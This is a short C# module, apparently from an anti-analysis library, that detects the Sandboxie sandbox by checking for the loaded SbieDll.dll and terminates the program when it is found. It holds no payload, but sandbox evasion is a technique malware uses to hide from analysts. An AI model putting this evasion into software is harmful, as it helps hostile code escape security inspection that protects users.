using System;
using System.Collections.Generic;

namespace Anti_Analysis.Modules
{
    class Sandboxie : IAAM
    {
        public override string Name => "Anti Sandboxie";
        public override string Description => "Prevents file from running in Sandboxie environment.";

        public override void DoWork(DetectionMethod m)
        { 
            // Basic Method - check for loaded sandboxie library
            if (Helpr.GetModuleHandle("SbieDll.dll") != IntPtr.Zero)
                Helpr.Die(m);
        }
        
    }
}
